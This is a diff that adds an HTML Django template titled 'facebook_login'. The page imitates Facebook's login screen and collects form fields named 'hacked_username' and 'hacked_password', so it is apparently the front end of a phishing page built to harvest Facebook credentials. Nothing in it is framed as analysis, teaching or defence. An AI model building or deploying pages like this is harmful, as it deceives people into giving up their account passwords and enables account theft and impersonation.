@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+    <meta name="" content="">
+    
+    <link rel="stylesheet" href="static/Facebook.css" />
+    <title>facebook_login</title>
+  </head>
+  <body>
+    <div class="Facebook_form">
+      <h1>facebook</h1>
+      <form action="" method="post" accept-charset="utf-8">
+        {% csrf_token %}
+        {{ form.hacked_username }}<br>
+        {{ form.hacked_password }}<br>
+        <button type="submit">Continue with facebook</button>
+      </form>
+    </div>
+  </body>
+</html>
